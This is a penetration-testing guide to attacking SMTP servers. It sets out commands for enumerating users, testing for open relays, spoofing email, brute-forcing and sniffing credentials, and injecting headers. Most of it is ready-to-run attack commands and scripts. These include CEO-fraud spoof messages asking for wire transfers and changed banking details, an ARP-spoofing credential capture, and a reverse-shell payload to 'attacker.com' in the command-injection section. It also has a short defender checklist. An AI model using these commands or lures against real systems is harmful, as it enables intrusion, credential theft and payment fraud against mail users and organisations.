# Port 25 - SMTP (Simple Mail Transfer Protocol) - Complete Attack Guide

## Overview

**Protocol**: SMTP (Simple Mail Transfer Protocol)
**Port**: 25 (SMTP), 465 (SMTPS), 587 (Submission)
**Transport**: TCP
**Encryption**: Optional (STARTTLS on 587, SSL on 465)
**Authentication**: Optional (PLAIN, LOGIN, CRAM-MD5)

## Attack Objectives

- **User Enumeration**: Discover valid email addresses
- **Open Relay Testing**: Find misconfigured mail servers
- **Email Spoofing**: Send forged emails
- **Credential Harvesting**: Capture SMTP credentials
- **Spam/Phishing**: Use server for malicious emails
- **Information Gathering**: Extract server details

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect SMTP Service**
```bash
# Quick scan
nmap -p 25,465,587 192.168.1.100

# Service version
nmap -p 25,465,587 -sV 192.168.1.100

# Comprehensive SMTP scripts
nmap -p 25 --script smtp-* 192.168.1.100

# All SMTP related
nmap -p 25,465,587,2525 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-* 192.168.1.100
```

**1.2 Banner Grabbing**
```bash
# Using nc
nc -v 192.168.1.100 25

# Using telnet
telnet 192.168.1.100 25

# Using nmap
nmap -p 25 --script banner 192.168.1.100

# Get capabilities
echo "EHLO test" | nc 192.168.1.100 25
```

**Example Banners**:
```
220 mail.example.com ESMTP Postfix
220 mx.google.com ESMTP
220 outlook.office365.com Microsoft ESMTP
220 smtp.gmail.com ESMTP
```

**1.3 Enumerate SMTP Commands**
```bash
# Get supported commands
nmap -p 25 --script smtp-commands 192.168.1.100

# Manual
telnet 192.168.1.100 25
EHLO test.com
# Server responds with supported commands
```

### Phase 2: User Enumeration

**2.1 VRFY Command (Verify User)**
```bash
# Manual enumeration
telnet 192.168.1.100 25
VRFY root
VRFY admin
VRFY postmaster
VRFY webmaster

# Using smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100
smtp-user-enum -M VRFY -u admin -t 192.168.1.100

# With Nmap
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} 192.168.1.100
```

**2.2 EXPN Command (Expand Mailing List)**
```bash
# Expand mailing lists
telnet 192.168.1.100 25
EXPN admin
EXPN postmaster

# Using smtp-user-enum
smtp-user-enum -M EXPN -U users.txt -t 192.168.1.100

# Nmap
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={EXPN} 192.168.1.100
```

**2.3 RCPT TO Command**
```bash
# Most reliable method (if others disabled)
telnet 192.168.1.100 25
HELO test.com
MAIL FROM:<test@test.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 No such user = invalid

# Using smtp-user-enum
smtp-user-enum -M RCPT -U users.txt -D target.com -t 192.168.1.100

# Automated
for user in admin root postmaster webmaster; do
  echo -e "HELO test\nMAIL FROM:<test@test.com>\nRCPT TO:<$user@target.com>\nQUIT" | nc 192.168.1.100 25
done
```

**2.4 Metasploit User Enumeration**
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

### Phase 3: Open Relay Testing

**3.1 Check for Open Relay**
```bash
# Using Nmap
nmap -p 25 --script smtp-open-relay 192.168.1.100

# Manual test
telnet 192.168.1.100 25
HELO test.com
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@external.com>
DATA
Subject: Test
Test message
.
QUIT

# If server accepts, it's an open relay!

# Automated
swaks --to victim@external.com --from attacker@external.com --server 192.168.1.100
```

**3.2 Test Different Relay Scenarios**
```bash
# Test 1: External to external
MAIL FROM:<user@domain1.com>
RCPT TO:<user@domain2.com>

# Test 2: No authentication
# Just try sending without AUTH

# Test 3: Null sender
MAIL FROM:<>
RCPT TO:<victim@external.com>

# Test 4: Local domain spoof
MAIL FROM:<admin@target.com>
RCPT TO:<user@external.com>
```

### Phase 4: Email Spoofing

**4.1 Basic Email Spoofing**
```bash
# Using telnet
telnet 192.168.1.100 25
HELO attacker.com
MAIL FROM:<ceo@company.com>
RCPT TO:<victim@target.com>
DATA
From: CEO <ceo@company.com>
To: victim@target.com
Subject: Urgent - Wire Transfer

Please transfer $10,000 to account XYZ immediately.

Best regards,
CEO
.
QUIT
```

**4.2 Using swaks (Swiss Army Knife SMTP)**
```bash
# Basic spoof
swaks --to victim@target.com --from ceo@company.com --server 192.168.1.100 --body "Test message"

# With custom headers
swaks --to victim@target.com \
      --from ceo@company.com \
      --h-From: "CEO <ceo@company.com>" \
      --h-Subject: "Urgent Request" \
      --body "Please act on this immediately" \
      --server 192.168.1.100

# With attachment
swaks --to victim@target.com \
      --from admin@company.com \
      --attach /path/to/file.pdf \
      --server 192.168.1.100
```

**4.3 Using sendemail**
```bash
sendemail -f ceo@company.com \
          -t victim@target.com \
          -u "Urgent Action Required" \
          -m "Please respond ASAP" \
          -s 192.168.1.100
```

**4.4 Python SMTP Script**
```python
#!/usr/bin/python3
import smtplib
from email.mime.text import MIMEText

sender = "ceo@company.com"
recipient = "victim@target.com"
subject = "Urgent Request"
body = "Please wire $10,000 immediately."

msg = MIMEText(body)
msg['From'] = sender
msg['To'] = recipient
msg['Subject'] = subject

try:
    server = smtplib.SMTP('192.168.1.100', 25)
    server.sendmail(sender, recipient, msg.as_string())
    server.quit()
    print("[+] Email sent successfully")
except Exception as e:
    print(f"[-] Error: {e}")
```

### Phase 5: Credential Attacks

**5.1 Brute Force Authentication**
```bash
# Using Hydra
hydra -l admin@target.com -P passwords.txt smtp://192.168.1.100

# With TLS (port 587)
hydra -l admin@target.com -P passwords.txt smtp://192.168.1.100:587

# Multiple users
hydra -L users.txt -P passwords.txt smtp://192.168.1.100

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**5.2 Credential Sniffing (MITM)**
```bash
# Capture SMTP auth with tcpdump
tcpdump -i eth0 -A 'tcp port 25 or tcp port 587' -w smtp_capture.pcap

# Filter for AUTH commands
tcpdump -r smtp_capture.pcap -A | grep -i "AUTH\|USER\|PASS"

# Using Wireshark
# Filter: smtp
# Follow TCP stream for full conversation

# Using Ettercap
ettercap -T -i eth0 -M arp /// /// -q
# Captures SMTP credentials automatically
```

**5.3 AUTH Mechanisms**
```bash
# Check supported AUTH methods
telnet 192.168.1.100 25
EHLO test
# Look for: AUTH PLAIN LOGIN CRAM-MD5

# PLAIN authentication (Base64 encoded)
AUTH PLAIN
# Encode: \0username\0password in Base64
echo -ne '\0admin@target.com\0password' | base64
# AGFkbWluQHRhcmdldC5jb20AcGFzc3dvcmQ=
AUTH PLAIN AGFkbWluQHRhcmdldC5jb20AcGFzc3dvcmQ=

# LOGIN authentication
AUTH LOGIN
# Then: Base64(username)
echo -n 'admin@target.com' | base64
# Then: Base64(password)
echo -n 'password' | base64
```

### Phase 6: Exploitation

**6.1 Header Injection**
```bash
# Inject additional recipients
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim1@target.com>
DATA
To: victim1@target.com
Cc: victim2@target.com, victim3@target.com
Bcc: attacker@evil.com
Subject: Important Notice

Message here
.

# CRLF injection
DATA
Subject: Test%0D%0A
Bcc: attacker@evil.com%0D%0A

Body
.
```

**6.2 SPF/DKIM/DMARC Bypass**
```bash
# Check current SPF record
dig target.com TXT | grep spf

# Check DKIM
dig default._domainkey.target.com TXT

# Check DMARC
dig _dmarc.target.com TXT

# If weak/missing, spoofing easier
# Send from subdomain if SPF not comprehensive
MAIL FROM:<admin@mail.target.com>

# Or use similar domain
MAIL FROM:<admin@tarqet.com>  # Typosquatting
```

**6.3 Command Injection (Rare)**
```bash
# If vulnerable to command injection in email processing
RCPT TO:<user@target.com; $(whoami)>
RCPT TO:<`whoami`@target.com>

# In email body (processed by scripts)
Subject: test$(nc attacker.com 4444 -e /bin/bash)
```

## Bypass Techniques

### Bypassing Blacklists
```bash
# Use alternate FROM addresses
MAIL FROM:<noreply@target.com>
MAIL FROM:<postmaster@target.com>

# Use different encoding
# Instead of: admin@target.com
# Try: admin%40target.com

# Different representation
RCPT TO:<"admin"@target.com>
RCPT TO:<admin@[192.168.1.100]>
```

### Bypassing Rate Limiting
```bash
# Slow down requests
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -w 5
# -w 5: 5 second delay

# Rotate IPs if possible
# Use multiple sources

# Distribute over time
for user in $(cat users.txt); do
  echo "VRFY $user" | nc 192.168.1.100 25
  sleep 10
done
```

## Information Extraction

**Key Information to Gather**:
```bash
# Server software and version
220 banner

# Supported commands
EHLO response

# Valid users
VRFY/EXPN/RCPT results

# Relay configuration
Open relay test results

# Authentication methods
AUTH capabilities

# Connected hosts
HELO/EHLO reveals internal hostnames
```

## Security Recommendations

**For Defenders**:
1. **Disable VRFY/EXPN** - Prevent user enumeration
2. **Require Authentication** - No anonymous sending
3. **SPF/DKIM/DMARC** - Email authentication
4. **Rate Limiting** - Prevent brute force
5. **Deny Relay** - Only accept mail for local domains
6. **TLS Encryption** - Force STARTTLS
7. **Logging** - Monitor all SMTP activity
8. **Greylisting** - Slow down spam
9. **Reverse DNS** - Check sender validity
10. **Content Filtering** - Scan for malicious content

## Common Mistakes

**Attacker Mistakes**:
1. Too many VRFY attempts - Detection
2. Not checking relay first - Missed opportunity
3. Poor spoofing - SPF/DKIM catches
4. Forgetting alternate ports (587, 465)

**Defender Mistakes**:
1. VRFY/EXPN enabled - User enumeration
2. Open relay - Spam abuse
3. No SPF/DKIM - Email spoofing easy
4. Weak authentication - Brute force success
5. No TLS enforcement - Credential sniffing

## Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 25,587 -sV 192.168.1.100
# Result: 25/tcp open smtp Postfix

# Phase 2: Enumerate users
smtp-user-enum -M RCPT -U users.txt -D target.com -t 192.168.1.100
# Found: admin, sales, support

# Phase 3: Check open relay
nmap --script smtp-open-relay 192.168.1.100
# Result: Open relay detected!

# Phase 4: Send spoofed email
swaks --to sales@target.com \
      --from ceo@target.com \
      --h-Subject "Update Banking Details" \
      --body "Please update our banking details to: Account 123456" \
      --server 192.168.1.100

# Phase 5: Monitor for response
# Wait for victim to reply or act on email
```

## Tools Summary

**Best Tool for Each Task**:
- **User Enumeration**: smtp-user-enum
- **Open Relay**: Nmap scripts, swaks
- **Spoofing**: swaks, sendemail, telnet
- **Brute Force**: Hydra
- **Sniffing**: Wireshark, tcpdump
- **Testing**: swaks (Swiss Army Knife)

## Related Attacks

- **Port 110/143 (POP3/IMAP)**: Same credentials often work
- **Port 80/443**: Webmail uses same accounts
- **Port 389 (LDAP)**: Email addresses enumeration
- **Social Engineering**: Phishing campaigns

---

**Last Updated**: 2026-06-16
